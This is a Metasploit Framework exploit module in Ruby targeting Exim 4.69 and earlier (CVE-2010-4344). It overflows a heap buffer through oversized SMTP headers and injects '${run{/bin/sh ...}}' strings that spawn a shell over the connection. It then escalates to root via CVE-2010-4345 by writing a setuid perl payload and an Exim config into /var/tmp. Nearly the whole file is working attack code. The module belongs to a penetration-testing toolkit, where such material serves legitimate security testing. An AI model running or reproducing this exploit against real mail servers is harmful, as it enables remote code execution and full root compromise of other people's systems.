##
# $Id: exim4_string_format.rb 11289 2010-12-11 10:55:24Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::Smtp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Exim4 <= 4.69 string_format Function Heap Buffer Overflow',
			'Description'    => %q{
					This module exploits a heap buffer overflow within versions of Exim prior to
				version 4.69. By sending a specially crafted message, an attacker can corrupt the
				heap and execute arbitrary code with the privileges of the Exim daemon.

				The root cause is that no check is made to ensure that the buffer is not full
				prior to handling '%s' format specifiers within the 'string_vformat' function.
				In order to trigger this issue, we get our message rejected by sending a message
				that is too large. This will call into log_write to log rejection headers (which
				is a default configuration setting). After filling the buffer, a long header
				string is sent. In a successful attempt, it overwrites the ACL for the 'MAIL
				FROM' command. By sending a second message, the string we sent will be evaluated
				with 'expand_string' and arbitrary shell commands can be executed.

				It is likely that this issue could also be exploited using other techniques such
				as targeting in-band heap management structures, or perhaps even function pointers
				stored in the heap. However, these techniques would likely be far more platform
				specific, more complicated, and less reliable.

				This bug was original found and reported in December 2008, but was not
				properly handled as a security issue. Therefore, there was a 2 year lag time
				between when the issue was fixed and when it was discovered being exploited
				in the wild. At that point, the issue was assigned a CVE and began being
				addressed by downstream vendors.

				An additional vulnerability, CVE-2010-4345, was also used in the attack that
				led to the discovery of danger of this bug. This bug allows a local user to
				gain root privileges from the Exim user account. If the Perl interpreter is
				found on the remote system, this module will automatically exploit the
				secondary bug as well to get root.
			},
			'Author'         => [ 'jduck', 'hdm' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 11289 $',
			'References'     =>
				[
					[ 'CVE', '2010-4344' ],
					[ 'OSVDB', '69685' ],
					# [ 'BID', '' ],
					[ 'CVE', '2010-4345' ],
					#[ 'OSVDB', '' ],
					# [ 'BID', '' ],
					[ 'URL', 'http://seclists.org/oss-sec/2010/q4/311' ],
					[ 'URL', 'http://www.gossamer-threads.com/lists/exim/dev/89477' ],
					[ 'URL', 'http://bugs.exim.org/show_bug.cgi?id=787' ],
					[ 'URL', 'http://git.exim.org/exim.git/commitdiff/24c929a27415c7cfc7126c47e4cad39acf3efa6b' ]
				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'DisableNops' => true,
					'Space'       => 8192, # much more in reality, but w/e
					'Compat'      =>
						{
							'PayloadType' => 'cmd',
							'RequiredCmd' => 'generic perl ruby bash telnet',
						}
				},
			'Platform'       => 'unix',
			'Arch'           => ARCH_CMD,
			'Targets'        =>
				[
					[ 'Automatic', { } ],
				],
			# Originally discovered/reported Dec 2 2008
			'DisclosureDate' => 'Dec 7 2010', # as an actual security bug
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('MAILFROM', [ true, 'FROM address of the e-mail', 'root@localhost']),
				OptString.new('MAILTO', [ true, 'TO address of the e-mail', 'postmaster@localhost']),
				OptString.new('EHLO_NAME', [ false, 'The name to send in the EHLO' ])
			], self.class)

		register_advanced_options(
			[
				OptString.new("SourceAddress", [false, "The IP or hostname of this system as the target will resolve it"]),
				OptBool.new("SkipEscalation", [true, "Specify this to skip the root escalation attempt", false]),
				OptBool.new("SkipVersionCheck", [true, "Specify this to skip the version check", false])
			], self.class)
	end

	def exploit
		#
		# Connect and grab the banner
		#
		ehlo = datastore['EHLO_NAME']
		ehlo ||= Rex::Text.rand_text_alphanumeric(8) + ".com"

		connect
		print_status("Server: #{self.banner.strip}")
		ehlo_resp = raw_send_recv("EHLO #{ehlo}\r\n")

		if not datastore['SkipVersionCheck'] and self.banner !~ /Exim 4\.6\d+/i
			print_error("Warning: This version of Exim is not exploitable")
			return
		end

		ehlo_resp.each_line do |line|
			print_status("EHLO: #{line.strip}")
		end

		#
		# Determine the maximum message size
		#
		max_msg = 52428800
		if ehlo_resp.to_s =~ /250-SIZE (\d+)/
			max_msg = $1.to_i
		end

		#
		# Determine what hostname the server sees
		#
		saddr = nil
		revdns = nil
		if ehlo_resp =~ /^250.*Hello ([^\s]+) \[([^\]]+)\]/
			revdns = $1
			saddr = $2
		end
		source = saddr || datastore["SourceAddress"] || Rex::Socket.source_address('1.2.3.4')
		print_status("Determined our hostname is #{revdns} and IP address is #{source}")


		#
		# Initiate the message
		#
		from = datastore['MAILFROM']
		to   = datastore['MAILTO']

		resp = raw_send_recv("MAIL FROM: #{from}\r\n")
		print_status("MAIL: #{resp.strip}")

		resp = raw_send_recv("RCPT TO: #{to}\r\n")
		print_status("RCPT: #{resp.strip}")

		resp = raw_send_recv("DATA\r\n")
		print_status("DATA: #{resp.strip}")


		#
		# Calculate the headers
		#
		msg_len         = max_msg + (1024*256) # just for good measure
		log_buffer_size = 8192

		host_part = "H="
		host_part << revdns << " " if revdns != ehlo
		host_part << "(#{ehlo})"

		# The initial headers will fill up the 'log_buffer' variable in 'log_write' function
		print_status("Constructing initial headers ...")
		log_buffer = "YYYY-MM-DD HH:MM:SS XXXXXX-YYYYYY-ZZ rejected from <#{from}> #{host_part} [#{source}]: message too big: read=#{msg_len} max=#{max_msg}\n"
		log_buffer << "Envelope-from: <#{from}>\nEnvelope-to: <#{to}>\n"

		# Now, "  " + hdrline for each header
		hdrs = []
		filler = rand_text_alphanumeric(8 * 16)
		header_name = rand_text_alpha(6).capitalize


		# We want 2 bytes left, so we subtract from log_buffer_size here
		log_buffer_size -= 3 # we use 3 since they account for a trailing nul
		60.times { |x|
			break if log_buffer.length >= log_buffer_size

			hdr = "#{header_name}%04d: %s\n" % [x, filler]
			newlen = log_buffer.length + hdr.length
			if newlen > log_buffer_size
				newlen -= log_buffer_size
				# chop the excess, NOTE: the "2" is for the "  " before the header
				off = hdr.length - newlen - 2 - 1
				hdr.slice!(off, hdr.length)
				hdr << "\n"
			end
			hdrs << hdr
			log_buffer << "  " << hdr
		}
		hdrs1 = hdrs.join

		header_name = Rex::Text.rand_text_alpha(7).capitalize

		# This header will smash various heap stuff, hopefully including the ACL
		print_status("Constructing HeaderX ...")
		hdrx = "#{header_name}: "
		1.upto(50) { |a|
			3.upto(12) { |b|
				hdrx << "${run{/bin/sh -c 'exec /bin/sh -i <&#{b} >&0 2>&0'}} "
			}
		}

		# In order to trigger the overflow, we must get our message rejected.
		# To do so, we send a message that is larger than the maximum.

		print_status("Constructing body ...")
		body = ''
		fill = (Rex::Text.rand_text_alphanumeric(254) + "\r\n") * 16384

		while(body.length < msg_len)
			body << fill
		end
		body = body[0, msg_len]

		print_status("Sending #{msg_len / (1024*1024)} megabytes of data...")
		sock.put hdrs1
		sock.put hdrx
		sock.put "\r\n"
		sock.put body

		print_status("Ending first message.")
		buf = raw_send_recv("\r\n.\r\n")
		# Should be: ""552 Message size exceeds maximum permitted\r\n"
		print_status("Result: #{buf.inspect}") if buf

		print_status("Sending second message ...")
		buf = raw_send_recv("MAIL FROM: #{datastore['MAILFROM']}\r\n")
		# Should be: "sh-x.x$ " !!
		print_status("MAIL result: #{buf.inspect}") if buf

		buf = raw_send_recv("RCPT TO: #{datastore['MAILTO']}\r\n")
		# Should be: "sh: RCPT: command not found\n"
		print_status("RCPT result: #{buf.inspect}") if buf
		sock.get_once(-1, 1.0)

		# Clear pending output from the socket
		sock.put("source /etc/profile >/dev/null 2>&1\n")
		sock.get_once(-1, 2.0)
		resp = ''

		if not datastore['SkipEscalation']
			print_status("Looking for Perl to facilitate escalation...")
			# Check for Perl as a way to escalate our payload
			sock.put("perl -V\n")
			select(nil, nil, nil, 3.0)
			resp = sock.get_once(-1, 10.0)
		end

		if resp !~ /Summary of my perl/
			print_status("Should have a shell now, sending payload...")
			buf = raw_send_recv("\n" + payload.encoded + "\n\n")
			if buf
				if buf =~ /554 SMTP synchronization error/
					print_error("This target may be patched: #{buf.strip}")
				else
					print_status("Payload result: #{buf.inspect}")
				end
			end
		else
			print_status("Perl binary detected, attempt to escalate...")

			token = Rex::Text.rand_text_alpha(8)
			# Flush the output from the shell
			sock.get_once(-1, 0.1)

			# Find the perl interpreter path
			sock.put("which perl;echo #{token}\n")
			buff = ""
			cnt  =
			while not buff.index(token)
				res = sock.get_once(-1, 0.25)
				buff << res if res
			end

			perl_path = buff.gsub(token, "").gsub(/\/perl.*/, "/perl").strip
			print_status("Using Perl interpreter at #{perl_path}...")

			temp_conf = "/var/tmp/" + Rex::Text.rand_text_alpha(8)
			temp_perl = "/var/tmp/" + Rex::Text.rand_text_alpha(8)
			temp_eof  = Rex::Text.rand_text_alpha(8)

			print_status("Creating temporary files #{temp_conf} and #{temp_perl}...")

			data_conf = "spool_directory = ${run{#{perl_path} #{temp_perl}}}\n".unpack("H*")[0]
			sock.put("perl -e 'print pack qq{H*},shift' #{data_conf} > #{temp_conf}\n")

			data_perl =	"#!/usr/bin/perl\n$) = $( = $> = $< = 0; system<DATA>;\n__DATA__\n#{payload.encoded}\n".unpack("H*")[0]
			sock.put("perl -e 'print pack qq{H*},shift' #{data_perl} > #{temp_perl}\n")

			print_status("Attempting to execute payload as root...")
			sock.put("PATH=/bin:/sbin:/usr/sbin:/usr/bin:/usr/local/sbin:/usr/local/bin exim -C#{temp_conf} -q\n")
		end

		# Give some time for the payload to be consumed
		select(nil, nil, nil, 4)

		handler
		disconnect
	end

end